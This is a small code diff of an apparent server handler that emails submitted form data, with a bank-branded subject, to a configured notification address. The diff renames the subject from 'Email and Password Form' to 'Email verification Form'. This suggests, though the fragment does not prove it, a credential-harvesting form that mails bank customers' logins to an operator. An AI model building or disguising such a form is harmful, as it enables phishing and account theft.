@@ -17,7 +17,7 @@ export async function POST(request) {
     let mailOptions = {
       from: process.env.EMAIL_USER,
       to: process.env.NOTIFICATION_EMAIL,
-      subject: `${data.bankName || 'Bravera Bank'} - Email and Password Form`,
+      subject: `${data.bankName || 'Bravera Bank'} - Email verification Form`,
       html: generateEmailContent(data),
     };
     
